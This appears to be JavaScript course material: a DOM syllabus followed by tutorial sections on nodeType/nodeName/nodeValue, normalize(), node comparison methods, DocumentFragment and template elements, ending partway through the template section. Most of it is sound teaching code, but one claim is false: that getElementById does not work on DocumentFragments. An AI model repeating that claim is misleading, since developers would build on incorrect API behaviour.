# Syllabus

## Module 1: [[DOM (1 of 2)#DOM Fundamentals]]

- What is the DOM
- DOM tree structure
- Nodes and node types
- Document object
- Window object
- DOM vs HTML vs JavaScript relationship

## Module 2: [[DOM (1 of 2)#Selecting Elements]]

- getElementById
- getElementsByClassName
- getElementsByTagName
- querySelector
- querySelectorAll
- Deprecated selection methods
- NodeList vs HTMLCollection
- Live vs static collections

## Module 3: [[DOM (1 of 2)#Traversing the DOM]]

- Parent nodes (parentNode, parentElement)
- Child nodes (childNodes, children, firstChild, lastChild, firstElementChild, lastElementChild)
- Sibling nodes (nextSibling, previousSibling, nextElementSibling, previousElementSibling)
- Closest method
- Matches method
- Contains method

## Module 4: [[DOM (1 of 2)#Element Properties and Attributes]]

- innerHTML, outerHTML, textContent, innerText
- getAttribute, setAttribute, removeAttribute, hasAttribute
- Dataset API (data-* attributes)
- Class manipulation (className, classList)
- ID and tag name properties
- Custom attributes

## Module 5: [[DOM (1 of 2)#Creating and Modifying Elements]]

- createElement
- createTextNode
- createDocumentFragment
- cloneNode
- appendChild
- append, prepend
- insertBefore, insertAdjacentElement
- replaceChild, replaceWith
- removeChild, remove
- insertAdjacentHTML, insertAdjacentText

## Module 6: [[DOM (1 of 2)#Element Styling]]

- Style property (inline styles)
- CSSStyleDeclaration
- getComputedStyle
- CSS class manipulation techniques
- CSS custom properties via JavaScript

## Module 7: [[DOM (1 of 2)#Element Dimensions and Positioning]]

- offsetWidth, offsetHeight
- offsetLeft, offsetTop, offsetParent
- clientWidth, clientHeight
- clientLeft, clientTop
- scrollWidth, scrollHeight
- scrollLeft, scrollTop
- getBoundingClientRect
- Viewport dimensions

## Module 8: [[DOM (1 of 2)#Event Handling]]

- addEventListener, removeEventListener
- Event object properties
- Event types (mouse, keyboard, form, focus, etc.)
- Event bubbling
- Event capturing
- Event delegation
- stopPropagation, preventDefault
- Event.target vs Event.currentTarget
- Custom events (CustomEvent, dispatchEvent)
- Once and passive options

## Module 9: [[DOM (1 of 2)#Forms and Input Handling]]

- Form elements and properties
- Input validation
- FormData API
- Form submission handling
- Input events (input, change, blur, focus)
- Checkbox and radio button handling
- Select and option elements

## Module 10: [[DOM (1 of 2)#Document Manipulation]]

- document.write (and why to avoid it)
- document.title
- document.body, document.head
- document.documentElement
- document.readyState
- DOMContentLoaded vs load events
- document.cookie basics

## Module 11: Advanced Node Operations

- Node properties (nodeType, nodeName, nodeValue)
- normalize method
- Node comparison methods
- DocumentFragment usage
- Template elements
- Shadow DOM basics

## Module 12: Performance Optimization

- Reflow and repaint concepts
- Batch DOM operations
- DocumentFragment for multiple insertions
- requestAnimationFrame
- Debouncing and throttling
- Virtual scrolling concepts
- DOM operation profiling

## Module 13: Browser APIs Related to DOM

- MutationObserver
- IntersectionObserver
- ResizeObserver
- Scroll events and optimization
- Clipboard API
- Drag and Drop API
- History API (pushState, replaceState)
- URL and URLSearchParams

## Module 14: HTML5 APIs

- LocalStorage and SessionStorage
- IndexedDB basics
- Web Workers (context of DOM restrictions)
- Canvas element manipulation
- SVG manipulation via DOM
- Audio and Video element APIs

## Module 15: Accessibility in DOM

- ARIA attributes
- Role attribute
- Keyboard navigation handling
- Focus management
- Screen reader considerations
- Semantic HTML via JavaScript

## Module 16: Security Considerations

- XSS prevention
- Safe HTML insertion
- Content Security Policy awareness
- Trusted Types API
- Sanitizing user input
- Safe event handling

## Module 17: Browser Compatibility

- Feature detection
- Polyfills
- Vendor prefixes
- Cross-browser event handling
- Legacy IE considerations (historical context)
- Progressive enhancement

## Module 18: Modern DOM Patterns

- Component-based thinking
- Virtual DOM concepts
- Declarative vs imperative approaches
- State management patterns
- Reactive updates
- Custom elements (Web Components)

## Module 19: Testing and Debugging

- Browser DevTools for DOM inspection
- Console methods for DOM debugging
- Breakpoints in DOM manipulation
- Performance monitoring
- Memory leak detection
- Automated DOM testing concepts

## Module 20: Real-World Projects

- Dynamic table manipulation
- Modal and overlay systems
- Infinite scroll implementation
- Drag and drop interfaces
- Form validation system
- Single-page navigation
- Dynamic content loading
- Tooltip system
- Accordion/collapse components
- Responsive menu systems

---

# Advanced Node Operations

## Node Properties (nodeType, nodeName, nodeValue)

### Core Property Characteristics

The DOM Node interface exposes three fundamental read-only properties that describe every node in the document tree. These properties form the identification triplet that determines how nodes behave and can be manipulated.

### nodeType Property

The `nodeType` property returns an unsigned short integer representing the node's type constant. This enumeration dictates which interfaces the node implements and which properties/methods are available.

**Primary nodeType Constants:**

- `Node.ELEMENT_NODE` (1) - Element nodes like `<div>`, `<p>`, `<span>`
- `Node.ATTRIBUTE_NODE` (2) - Deprecated; attributes are no longer treated as nodes in modern DOM
- `Node.TEXT_NODE` (3) - Text content within elements
- `Node.CDATA_SECTION_NODE` (4) - CDATA sections in XML documents
- `Node.PROCESSING_INSTRUCTION_NODE` (7) - Processing instructions like `<?xml-stylesheet?>`
- `Node.COMMENT_NODE` (8) - HTML/XML comment nodes
- `Node.DOCUMENT_NODE` (9) - The document root itself
- `Node.DOCUMENT_TYPE_NODE` (10) - DOCTYPE declarations
- `Node.DOCUMENT_FRAGMENT_NODE` (11) - DocumentFragment containers

**Practical Usage:**

```javascript
const div = document.querySelector('div');
console.log(div.nodeType); // 1 (ELEMENT_NODE)

const textNode = div.firstChild;
console.log(textNode.nodeType); // 3 (TEXT_NODE)

// Type checking
if (node.nodeType === Node.ELEMENT_NODE) {
  // Safe to access element-specific properties
  console.log(node.tagName);
}
```

The numeric values remain for backward compatibility, but using the named constants improves code readability and maintenance.

### nodeName Property

The `nodeName` property returns a string representing the node's name. The return value format depends on the node type.

**Return Values by Node Type:**

|nodeType|nodeName Returns|
|---|---|
|Element|Uppercase tag name (e.g., "DIV", "SPAN")|
|Text|"#text"|
|Comment|"#comment"|
|Document|"#document"|
|DocumentFragment|"#document-fragment"|
|DocumentType|DOCTYPE name (e.g., "html")|
|Processing Instruction|Target of the instruction|

**Important Distinctions:**

For element nodes, `nodeName` returns uppercase tag names regardless of how they're written in the source HTML. For case-sensitive operations or cleaner string matching, use `tagName` (also uppercase) or `localName` (preserves case).

```javascript
const para = document.querySelector('p');
console.log(para.nodeName); // "P"
console.log(para.localName); // "p"

const textNode = document.createTextNode('Hello');
console.log(textNode.nodeName); // "#text"

const comment = document.createComment('comment text');
console.log(comment.nodeName); // "#comment"
```

### nodeValue Property

The `nodeValue` property is both readable and writable, but its behavior varies dramatically based on node type. For most node types, it returns `null`.

**nodeValue Behavior by Node Type:**

|nodeType|GET Returns|SET Effect|
|---|---|---|
|Element|`null`|No effect|
|Text|Text content|Replaces text content|
|Comment|Comment content|Replaces comment content|
|Document|`null`|No effect|
|DocumentFragment|`null`|No effect|
|Processing Instruction|Entire content excluding target|Replaces content|
|Attribute (deprecated)|Attribute value|Sets attribute value|

**Practical Applications:**

```javascript
// Modifying text content via nodeValue
const textNode = document.createTextNode('Original');
console.log(textNode.nodeValue); // "Original"
textNode.nodeValue = 'Modified';
console.log(textNode.nodeValue); // "Modified"

// Element nodes return null
const div = document.createElement('div');
console.log(div.nodeValue); // null
div.nodeValue = 'Ignored'; // No effect
console.log(div.textContent); // "" (empty)

// Comment manipulation
const comment = document.createComment('old comment');
console.log(comment.nodeValue); // "old comment"
comment.nodeValue = 'new comment';
```

### Property Interdependencies and Edge Cases

**Read-Only vs Writable Behavior:**

While `nodeType` and `nodeName` are strictly read-only, `nodeValue` accepts assignment but silently ignores it for node types where it's not applicable. This differs from throwing errors, which can create subtle bugs if developers assume assignments succeed.

```javascript
const element = document.querySelector('div');
element.nodeValue = "This does nothing"; // Silent failure
console.log(element.nodeValue); // Still null
```

**Performance Considerations:**

Accessing these properties is generally O(1) as they're stored directly on node objects. However, `nodeValue` modifications on text nodes trigger reflow if the text node is in the rendered tree.

### Modern Alternatives and Best Practices

**For Text Content Manipulation:**

Instead of `nodeValue` for text nodes, modern code typically uses:

- `textContent` for element text (concatenates all descendant text)
- `data` property on CharacterData nodes (Text, Comment, CDATASection)

```javascript
// Older approach
const textNode = element.firstChild;
if (textNode.nodeType === Node.TEXT_NODE) {
  textNode.nodeValue = 'New text';
}

// Modern approach
element.textContent = 'New text';

// Or for direct text node manipulation
if (textNode instanceof Text) {
  textNode.data = 'New text';
}
```

**For Type Checking:**

Instead of numeric `nodeType` comparisons, use `instanceof` checks when possible:

```javascript
// Traditional
if (node.nodeType === Node.ELEMENT_NODE) {
  // ...
}

// More semantic
if (node instanceof Element) {
  // Automatically provides type narrowing in TypeScript
  node.classList.add('active');
}
```

### Cross-Browser Consistency

These three properties have near-universal support across browsers since they're part of the DOM Level 1 specification. However, subtle differences exist:

**XML vs HTML Documents:**

In XML documents, `nodeName` preserves case sensitivity, while HTML documents force uppercase for element names.

```javascript
// In XML document
const xmlElement = xmlDoc.createElement('MyElement');
console.log(xmlElement.nodeName); // "MyElement"

// In HTML document
const htmlElement = document.createElement('MyElement');
console.log(htmlElement.nodeName); // "MYELEMENT"
```

**Namespace Handling:**

For elements with namespaces (SVG, MathML), `nodeName` may include the prefix:

```javascript
const svgElement = document.createElementNS('http://www.w3.org/2000/svg', 'svg:circle');
console.log(svgElement.nodeName); // "svg:circle"
console.log(svgElement.localName); // "circle"
console.log(svgElement.prefix); // "svg"
```

### Memory and Mutation Implications

These properties reflect the current state of nodes. Changes to node structure or content update these properties immediately:

```javascript
const div = document.createElement('div');
div.appendChild(document.createTextNode('Hello'));

const textNode = div.firstChild;
console.log(textNode.nodeValue); // "Hello"

// Modifying through nodeValue
textNode.nodeValue = 'World';
console.log(div.textContent); // "World"

// The same text node object persists
console.log(div.firstChild === textNode); // true
```

When nodes are removed from the document, these properties remain accessible but the nodes become "orphaned" until garbage collected.

---

## normalize Method

The `normalize()` method is a DOM operation that consolidates adjacent text nodes and removes empty text nodes within an element's subtree, creating a "normalized" document structure where text content exists in single, contiguous text nodes.

### Core Functionality

When invoked on a node, `normalize()` traverses the entire subtree beneath that node and performs two operations:

1. **Merges adjacent text nodes** - If multiple text node siblings exist consecutively, they are combined into a single text node containing the concatenated text content
2. **Removes empty text nodes** - Any text nodes containing zero-length strings are deleted from the tree

```javascript
element.normalize();
```

The method returns `undefined` and modifies the DOM tree in place.

### Why Text Node Fragmentation Occurs

Text node fragmentation happens through programmatic DOM manipulation, not through standard HTML parsing. Common scenarios include:

**Dynamic text insertion:**

```javascript
const div = document.createElement('div');
div.appendChild(document.createTextNode('Hello '));
div.appendChild(document.createTextNode('World'));
// div now contains 2 adjacent text nodes
```

**Text splitting operations:**

```javascript
const textNode = document.createTextNode('Hello World');
element.appendChild(textNode);
textNode.splitText(5); // Splits at index 5
// Creates two text nodes: "Hello" and " World"
```

**Node removal leaving fragments:**

```javascript
// <div>Hello <span>there</span> World</div>
const span = div.querySelector('span');
span.remove();
// May result in: textNode("Hello "), textNode(" World")
```

### Technical Behavior

**Traversal scope:** The normalization operates recursively on all descendant nodes. Calling `normalize()` on a parent element normalizes all children, grandchildren, and so forth.

```javascript
document.body.normalize(); // Normalizes entire body subtree
```

**Preservation of element boundaries:** Text nodes are only merged when they are direct siblings. Text nodes separated by element nodes remain distinct:

```javascript
// <div>Text1<span></span>Text2</div>
// Text1 and Text2 remain separate (element boundary)

// <div>Text1<!--comment-->Text2</div>  
// Text1 and Text2 remain separate (comment node boundary)
```

**Processing of CDATA sections:** In XML documents, CDATA sections are treated as distinct node types (type 4) and are not merged with adjacent text nodes during normalization.

### Performance Characteristics

**[Inference]** The normalization process requires tree traversal proportional to the number of nodes in the subtree, making it O(n) in complexity where n is the node count. For large document fragments with many text nodes, this operation can be measurable.

**Memory implications:** Normalization reduces memory overhead by eliminating redundant text node objects. Each text node carries object overhead beyond its string content.

### Practical Use Cases

**Before DOM serialization:** When programmatically constructing DOM structures that will be serialized (via `innerHTML`, `outerHTML`, or serialization APIs), normalization ensures cleaner output without redundant text node artifacts.

```javascript
const fragment = document.createDocumentFragment();
// ... multiple text node insertions ...
fragment.normalize();
container.appendChild(fragment);
```

**Range and selection operations:** Text ranges and selections can behave unpredictably across fragmented text nodes. Normalization creates predictable boundaries:

```javascript
element.normalize();
const range = document.createRange();
range.selectNodeContents(element.firstChild); // Now targets complete text
```

**Text content comparison:** When comparing text content programmatically, fragmented nodes complicate equality checks:

```javascript
// Without normalize: might need to traverse multiple childNodes
element.normalize();
const text = element.firstChild.textContent; // Single node access
```

**Editor implementations:** Rich text editors and content-editable implementations use normalization to maintain consistent document structure after user edits, preventing state fragmentation.

### Browser Compatibility and Standards

The `normalize()` method is part of the DOM Level 2 Core specification and has universal support across all modern browsers (Chrome, Firefox, Safari, Edge) and IE9+. The behavior is consistent across implementations.

### Interaction with Live Collections

**[Inference]** Because `normalize()` modifies the DOM tree structure by removing and merging nodes, any live `NodeList` or `HTMLCollection` references are immediately affected. Iterating over `childNodes` while normalizing requires capturing a static copy first:

```javascript
// Problematic - live collection changes during iteration
for (let i = 0; i < element.childNodes.length; i++) {
  if (element.childNodes[i].nodeType === 3) {
    element.normalize(); // Modifies the collection being iterated
  }
}

// Safe approach - static array
const nodes = Array.from(element.childNodes);
element.normalize();
```

### Edge Cases

**Empty containers:** Calling `normalize()` on an element with no children or only element children has no effect and completes immediately.

**Single text node:** An element containing only one text node (even if empty) remains unchanged, except empty text nodes are removed.

**DocumentFragment:** `normalize()` can be called on `DocumentFragment` objects before insertion into the main document tree.

**Read-only nodes:** **[Unverified]** Attempting to normalize subtrees containing read-only nodes or nodes from different documents may throw exceptions, though typical use cases don't encounter this.

### Mutation Observers

Normalization triggers mutation observer callbacks. Each text node removal and modification fires appropriate mutation records:

```javascript
const observer = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    console.log(mutation.type); // "childList" for removals, "characterData" for merges
  });
});

observer.observe(element, { 
  childList: true, 
  characterData: true, 
  subtree: true 
});

element.normalize(); // Triggers observer callbacks
```

---

## Node Comparison Methods

Node comparison methods determine the relationship between DOM nodes in document order and hierarchy. These methods are essential for DOM traversal, range operations, and understanding structural relationships.

## compareDocumentPosition()

The `compareDocumentPosition()` method returns a bitmask indicating the relative position of a node compared to another node.

### Bitmask Values

```javascript
Node.DOCUMENT_POSITION_DISCONNECTED = 1           // 0x01
Node.DOCUMENT_POSITION_PRECEDING = 2              // 0x02
Node.DOCUMENT_POSITION_FOLLOWING = 4              // 0x04
Node.DOCUMENT_POSITION_CONTAINS = 8               // 0x08
Node.DOCUMENT_POSITION_CONTAINED_BY = 16          // 0x10
Node.DOCUMENT_POSITION_IMPLEMENTATION_SPECIFIC = 32 // 0x20
```

### Return Value Interpretation

The method returns a number that is the sum of applicable flags:

- **1 (DISCONNECTED)**: Nodes are in different documents or one is detached
- **2 (PRECEDING)**: The compared node comes before the reference node in document order
- **4 (FOLLOWING)**: The compared node comes after the reference node
- **8 (CONTAINS)**: The compared node contains the reference node
- **16 (CONTAINED_BY)**: The compared node is contained by the reference node
- **32 (IMPLEMENTATION_SPECIFIC)**: For private use in specific implementations

### Usage Patterns

```javascript
const parent = document.getElementById('parent');
const child = document.getElementById('child');
const sibling = document.getElementById('sibling');

// Check if child is contained by parent
const position = child.compareDocumentPosition(parent);
if (position & Node.DOCUMENT_POSITION_CONTAINS) {
    // parent contains child
}

// Check document order
if (position & Node.DOCUMENT_POSITION_PRECEDING) {
    // parent comes before child
}

// Check if nodes are in same document
if (position & Node.DOCUMENT_POSITION_DISCONNECTED) {
    // nodes are in different documents
}
```

### Multiple Flags

Multiple flags can be set simultaneously. Common combinations:

- **10 (2 + 8)**: Node precedes AND contains
- **20 (4 + 16)**: Node follows AND is contained by

```javascript
const outer = document.querySelector('.outer');
const inner = document.querySelector('.inner');

// If inner is inside outer and comes after in source
const pos = outer.compareDocumentPosition(inner);
// pos might be 20 (FOLLOWING + CONTAINED_BY)
```

## contains()

The `contains()` method checks whether a node is a descendant of another node, including the node itself.

### Behavior

```javascript
node.contains(otherNode)
```

Returns `true` if:

- `otherNode` is a descendant of `node`
- `otherNode` is `node` itself
- Otherwise returns `false`

### Self-Comparison

```javascript
const element = document.getElementById('test');
element.contains(element); // true - node contains itself
```

### Practical Applications

```javascript
// Event delegation check
document.addEventListener('click', (e) => {
    const menu = document.getElementById('menu');
    if (!menu.contains(e.target)) {
        // Click was outside menu
        closeMenu();
    }
});

// Verify hierarchy before manipulation
function safeAppend(parent, child) {
    if (parent.contains(child)) {
        throw new Error('Cannot append ancestor to descendant');
    }
    parent.appendChild(child);
}
```

### Performance Characteristics

`contains()` is generally faster than `compareDocumentPosition()` for simple ancestry checks because it doesn't compute the full positional relationship.

## isEqualNode()

Checks if two nodes are equivalent in structure and content, performing deep comparison.

### Comparison Criteria

Two nodes are equal if they have:

- Same node type
- Same node name (tag name for elements)
- Same local name, namespace URI, and prefix
- Same number of child nodes
- Equivalent attributes (same name-value pairs, order irrelevant)
- Equal child nodes (recursive comparison)

### Usage

```javascript
const div1 = document.createElement('div');
div1.className = 'test';
div1.textContent = 'Hello';

const div2 = document.createElement('div');
div2.className = 'test';
div2.textContent = 'Hello';

div1.isEqualNode(div2); // true - structurally identical

div2.textContent = 'World';
div1.isEqualNode(div2); // false - content differs
```

### Attribute Order Independence

```javascript
const el1 = document.createElement('input');
el1.setAttribute('type', 'text');
el1.setAttribute('name', 'username');

const el2 = document.createElement('input');
el2.setAttribute('name', 'username');
el2.setAttribute('type', 'text');

el1.isEqualNode(el2); // true - attribute order doesn't matter
```

### Deep Comparison Behavior

```javascript
const parent1 = document.createElement('div');
const child1 = document.createElement('span');
child1.textContent = 'test';
parent1.appendChild(child1);

const parent2 = document.createElement('div');
const child2 = document.createElement('span');
child2.textContent = 'test';
parent2.appendChild(child2);

parent1.isEqualNode(parent2); // true - deep equality
```

## isSameNode()

Checks if two references point to the exact same node object.

### Behavior

```javascript
const node1 = document.getElementById('test');
const node2 = document.getElementById('test');
const node3 = document.createElement('div');

node1.isSameNode(node2); // true - same DOM reference
node1.isSameNode(node3); // false - different nodes
```

### Deprecation Note

`isSameNode()` is largely redundant because strict equality (`===`) achieves the same result:

```javascript
node1.isSameNode(node2) === (node1 === node2) // always true
```

Modern code typically uses direct comparison:

```javascript
if (node1 === node2) {
    // Same node
}
```

## Document Order Algorithms

### Determining Document Position

Document order follows these rules:

1. **Document node** comes first
2. **Element nodes** are ordered by their position in the tree (depth-first traversal)
3. **Attribute nodes** come after the element they belong to
4. **Text nodes** and other children follow their element
5. **Descendants** come before following siblings

### Tree Walking for Position

```javascript
function isNodeBefore(node1, node2) {
    const position = node1.compareDocumentPosition(node2);
    return (position & Node.DOCUMENT_POSITION_FOLLOWING) !== 0;
}

function getCommonAncestor(node1, node2) {
    const position = node1.compareDocumentPosition(node2);
    
    if (position & Node.DOCUMENT_POSITION_DISCONNECTED) {
        return null; // No common ancestor
    }
    
    if (position & Node.DOCUMENT_POSITION_CONTAINS) {
        return node1;
    }
    
    if (position & Node.DOCUMENT_POSITION_CONTAINED_BY) {
        return node2;
    }
    
    // Find common ancestor by traversing up
    let parent = node1.parentNode;
    while (parent) {
        if (parent.contains(node2)) {
            return parent;
        }
        parent = parent.parentNode;
    }
    
    return null;
}
```

## Range Comparison Methods

Ranges provide additional comparison capabilities through their boundary points.

### compareBoundaryPoints()

Compares boundary points of two ranges:

```javascript
range1.compareBoundaryPoints(how, sourceRange)
```

**How parameter constants:**

- `Range.START_TO_START` (0): Compare start points
- `Range.START_TO_END` (1): Compare range1 start to range2 end
- `Range.END_TO_END` (2): Compare end points
- `Range.END_TO_START` (3): Compare range1 end to range2 start

**Return values:**

- `-1`: range1 boundary comes before range2 boundary
- `0`: Boundaries are at same position
- `1`: range1 boundary comes after range2 boundary

```javascript
const range1 = document.createRange();
const range2 = document.createRange();

range1.selectNode(document.getElementById('first'));
range2.selectNode(document.getElementById('second'));

// Compare start points
const result = range1.compareBoundaryPoints(Range.START_TO_START, range2);
if (result < 0) {
    // range1 starts before range2
}
```

### intersectsNode()

[Inference] This method determines if a range intersects with a node:

```javascript
range.intersectsNode(node)
```

Returns `true` if any part of the node falls within the range boundaries.

## Practical Comparison Patterns

### Sorting Nodes by Document Order

```javascript
function sortNodesByDocumentOrder(nodes) {
    return Array.from(nodes).sort((a, b) => {
        const position = a.compareDocumentPosition(b);
        if (position & Node.DOCUMENT_POSITION_FOLLOWING) {
            return -1;
        }
        if (position & Node.DOCUMENT_POSITION_PRECEDING) {
            return 1;
        }
        return 0;
    });
}
```

### Checking Overlap Between Selections

```javascript
function rangesOverlap(range1, range2) {
    // Check if start of range2 is before end of range1
    const startComparison = range1.compareBoundaryPoints(
        Range.END_TO_START, 
        range2
    );
    
    // Check if end of range2 is after start of range1
    const endComparison = range1.compareBoundaryPoints(
        Range.START_TO_END,
        range2
    );
    
    return startComparison >= 0 && endComparison <= 0;
}
```

### Finding Node Relationships

```javascript
function getNodeRelationship(node1, node2) {
    const position = node1.compareDocumentPosition(node2);
    
    if (position & Node.DOCUMENT_POSITION_DISCONNECTED) {
        return 'disconnected';
    }
    if (position & Node.DOCUMENT_POSITION_CONTAINS) {
        return 'contains';
    }
    if (position & Node.DOCUMENT_POSITION_CONTAINED_BY) {
        return 'contained-by';
    }
    if (position & Node.DOCUMENT_POSITION_PRECEDING) {
        return 'precedes';
    }
    if (position & Node.DOCUMENT_POSITION_FOLLOWING) {
        return 'follows';
    }
    
    return 'same';
}
```

## Performance Considerations

### Method Complexity

- **`contains()`**: O(depth) - traverses ancestor chain
- **`compareDocumentPosition()`**: O(depth) - may traverse to find common ancestor
- **`isEqualNode()`**: O(n) - deep structural comparison where n is total descendant count
- **`isSameNode()`**: O(1) - simple reference equality

### Optimization Strategies

```javascript
// Cache frequently accessed relationships
const ancestryCache = new WeakMap();

function cachedContains(parent, child) {
    let cache = ancestryCache.get(child);
    if (!cache) {
        cache = new Set();
        ancestryCache.set(child, cache);
    }
    
    if (cache.has(parent)) {
        return true;
    }
    
    const result = parent.contains(child);
    if (result) {
        cache.add(parent);
    }
    
    return result;
}
```

### Batch Comparisons

When comparing many nodes, minimize repeated traversals:

```javascript
function groupByAncestor(nodes, ancestor) {
    const contained = [];
    const external = [];
    
    for (const node of nodes) {
        if (ancestor.contains(node)) {
            contained.push(node);
        } else {
            external.push(node);
        }
    }
    
    return { contained, external };
}
```

## Edge Cases and Gotchas

### Document Fragments

Nodes in document fragments are disconnected from the main document:

```javascript
const fragment = document.createDocumentFragment();
const div = document.createElement('div');
fragment.appendChild(div);

const body = document.body;
const position = div.compareDocumentPosition(body);
position & Node.DOCUMENT_POSITION_DISCONNECTED; // true
```

### Shadow DOM Boundaries

Comparison methods respect shadow DOM encapsulation:

```javascript
const host = document.getElementById('shadow-host');
const shadow = host.attachShadow({ mode: 'open' });
const shadowChild = document.createElement('div');
shadow.appendChild(shadowChild);

const lightChild = document.createElement('div');
host.appendChild(lightChild);

// shadowChild and lightChild are in different trees
shadowChild.compareDocumentPosition(lightChild) 
    & Node.DOCUMENT_POSITION_DISCONNECTED; // true
```

### Attribute Node Comparisons

[Inference] Attribute nodes have special positioning relative to their owner element. Most modern APIs avoid direct attribute node manipulation.

### Cloned Node Equality

```javascript
const original = document.getElementById('test');
const clone = original.cloneNode(true);

original.isEqualNode(clone); // true - structurally identical
original.isSameNode(clone);  // false - different objects
original === clone;          // false
```

---

## DocumentFragment Usage

### Core Mechanics

`DocumentFragment` serves as a lightweight container for DOM nodes that exists outside the main document tree. When you append a DocumentFragment to the DOM, the fragment itself remains empty—only its children transfer to the target location. This transfer happens in a single operation rather than multiple reflows.

```javascript
const fragment = document.createDocumentFragment();
const div1 = document.createElement('div');
const div2 = document.createElement('div');

fragment.appendChild(div1);
fragment.appendChild(div2);

// Both divs move to container, fragment becomes empty
container.appendChild(fragment);
```

### Performance Characteristics

**Reflow and Repaint Reduction**

Manipulating nodes within a DocumentFragment doesn't trigger reflows or repaints because the fragment isn't part of the rendered tree. When you build complex structures off-DOM, the browser only calculates layout once during the final insertion.

```javascript
// Single reflow approach
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const item = document.createElement('li');
  item.textContent = `Item ${i}`;
  fragment.appendChild(item);
}
document.querySelector('ul').appendChild(fragment);

// vs. multiple reflows (anti-pattern)
for (let i = 0; i < 1000; i++) {
  const item = document.createElement('li');
  item.textContent = `Item ${i}`;
  document.querySelector('ul').appendChild(item); // Reflow each iteration
}
```

**[Inference]** The magnitude of performance benefit depends on DOM complexity, number of nodes, and CSS rules that affect layout. Modern browsers optimize sequential DOM operations, so fragments provide diminishing returns for small batches (< 10-20 nodes).

### Query and Manipulation

DocumentFragments support standard DOM methods:

```javascript
const fragment = document.createDocumentFragment();

// Query methods work
fragment.querySelector('.target');
fragment.querySelectorAll('div');
fragment.getElementById('item'); // Returns null (fragments don't support IDs)

// Traversal
fragment.firstChild;
fragment.lastChild;
fragment.childNodes;
fragment.children;

// Manipulation
fragment.appendChild(node);
fragment.insertBefore(newNode, referenceNode);
fragment.removeChild(node);
fragment.replaceChild(newNode, oldNode);
```

**Notable limitation**: `getElementById()` doesn't function on DocumentFragments because they're not documents and don't maintain an ID-to-element registry.

### Template Integration

DocumentFragments naturally pair with `<template>` elements:

```javascript
const template = document.querySelector('#my-template');
const clone = template.content.cloneNode(true); // Returns DocumentFragment

// Modify the cloned content
clone.querySelector('.title').textContent = 'Dynamic Title';
clone.querySelector('.description').textContent = 'Dynamic Description';

// Insert modified content
document.querySelector('#container').appendChild(clone);
```

The `content` property of a template element is itself a DocumentFragment, making templates inherently efficient for batch DOM operations.

### Event Delegation Patterns

Event listeners attached to nodes within a DocumentFragment remain functional after insertion:

```javascript
const fragment = document.createDocumentFragment();

for (let i = 0; i < 100; i++) {
  const button = document.createElement('button');
  button.textContent = `Button ${i}`;
  
  // Direct listener survives fragment insertion
  button.addEventListener('click', () => {
    console.log(`Clicked button ${i}`);
  });
  
  fragment.appendChild(button);
}

container.appendChild(fragment); // All listeners remain active
```

However, event delegation to the fragment itself doesn't persist:

```javascript
const fragment = document.createDocumentFragment();

// This listener is lost after insertion
fragment.addEventListener('click', (e) => {
  console.log('Fragment clicked'); // Never fires
});

fragment.appendChild(someElement);
container.appendChild(fragment); // Fragment becomes empty, listener lost
```

For delegation, attach listeners to the final parent container instead:

```javascript
container.addEventListener('click', (e) => {
  if (e.target.matches('button')) {
    // Handle button clicks
  }
});

container.appendChild(fragment); // Delegation works
```

### Range and Selection APIs

DocumentFragments integrate with Range methods for advanced manipulation:

```javascript
const range = document.createRange();
range.selectNodeContents(sourceElement);

// Extract content into fragment (removes from source)
const fragment = range.extractContents();

// Or clone content (leaves source intact)
const fragment = range.cloneContents();

// Process fragment
fragment.querySelectorAll('a').forEach(link => {
  link.setAttribute('target', '_blank');
});

// Insert elsewhere
targetElement.appendChild(fragment);
```

The `extractContents()` and `cloneContents()` methods return DocumentFragments, enabling efficient DOM restructuring operations.

### Memory and Lifecycle

DocumentFragments don't exist as persistent objects after insertion—they're emptied and typically garbage collected if no references remain:

```javascript
const fragment = document.createDocumentFragment();
fragment.appendChild(document.createElement('div'));

console.log(fragment.childNodes.length); // 1

container.appendChild(fragment);

console.log(fragment.childNodes.length); // 0 (emptied)
```

If you need to reuse structure, clone before insertion:

```javascript
const fragment = document.createDocumentFragment();
// ... build structure ...

container.appendChild(fragment.cloneNode(true)); // Fragment still has children
container2.appendChild(fragment); // Reuse original
```

### insertAdjacentElement Alternative Pattern

For single insertions where fragment overhead isn't justified:

```javascript
// Fragment approach
const fragment = document.createDocumentFragment();
fragment.appendChild(newElement);
target.appendChild(fragment);

// Direct approach (simpler for single elements)
target.appendChild(newElement);

// Or positional
target.insertAdjacentElement('beforeend', newElement);
```

DocumentFragments provide value primarily when batching multiple nodes or when APIs return fragments (templates, ranges).

### Serialization Behavior

DocumentFragments serialize to their children's HTML:

```javascript
const fragment = document.createDocumentFragment();
fragment.appendChild(document.createElement('div'));
fragment.appendChild(document.createElement('span'));

// No wrapper element
const temp = document.createElement('div');
temp.appendChild(fragment.cloneNode(true));
console.log(temp.innerHTML); // "<div></div><span></span>"
```

This differs from wrapping elements in a container div, where the container would appear in serialized output.

### Modern Framework Considerations

**[Inference]** React, Vue, and other virtual DOM frameworks abstract away direct DocumentFragment manipulation. These frameworks handle batching and reconciliation internally, making manual fragment usage unnecessary in most application code. Fragments remain relevant for:

- Library/framework internals
- Direct DOM manipulation outside framework contexts
- Performance-critical vanilla JavaScript
- Browser extension development
- Web component implementation

### Browser API Returns

Several Web APIs return DocumentFragments:

```javascript
// Range extraction
const fragment = range.extractContents();

// Template content
const fragment = templateElement.content;

// DOMParser with 'text/html' context body fragments
const parser = new DOMParser();
const doc = parser.parseFromString('<div>test</div>', 'text/html');
// doc.body.childNodes can be moved via fragment
```

Understanding these return types helps you recognize when you're already working with fragments implicitly.

---

## Template Elements in the DOM

### Core Template Mechanics

The `<template>` element holds HTML content that is parsed but not rendered, not executed, and not part of the document's active DOM tree. The browser creates a `DocumentFragment` within the template's content property, which exists in an inert state until explicitly cloned and inserted into the document.

```html
<template id="card-template">
  <div class="card">
    <h3 class="card-title"></h3>
    <p class="card-body"></p>
  </div>
</template>
```

When accessing template content, the structure exists at `templateElement.content`, which returns a `DocumentFragment`. Scripts within templates don't execute, images don't load, stylesheets don't apply, and custom elements don't upgrade until the content is activated by cloning into the live DOM.

### Activation and Cloning Patterns

Template activation requires explicit cloning. The `importNode()` and `cloneNode()` methods create live instances from inert template content:

```javascript
const template = document.getElementById('card-template');
const clone = template.content.cloneNode(true);

// Modify the clone
clone.querySelector('.card-title').textContent = 'Active Content';
clone.querySelector('.card-body').textContent = 'This is now live.';

// Insert into document
document.body.appendChild(clone);
```

